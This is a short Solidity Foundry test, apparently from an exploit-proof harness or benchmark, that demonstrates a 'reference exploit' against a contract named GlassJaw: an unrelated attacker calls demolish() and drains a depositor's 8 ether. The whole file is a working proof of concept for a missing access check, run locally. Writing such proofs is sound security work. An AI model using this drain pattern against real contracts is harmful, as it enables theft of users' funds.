// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for GlassJaw. An unrelated account calls demolish() and takes the balance.
// Run by hand:  forge test --root proofground --match-contract ProveGlassJaw -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJaw is ExploitProof {
    function test_exploit() external {
        GlassJaw jaw = new GlassJaw();

        address alice = makeAddr("alice");
        vm.deal(alice, 8 ether);
        vm.prank(alice);
        jaw.deposit{value: 8 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        noteAttackerStart(attacker);

        vm.prank(attacker);
        jaw.demolish(attacker);

        profit = attacker.balance; // the whole 8-ether vault
        assertExploitLanded(7 ether);
    }
}
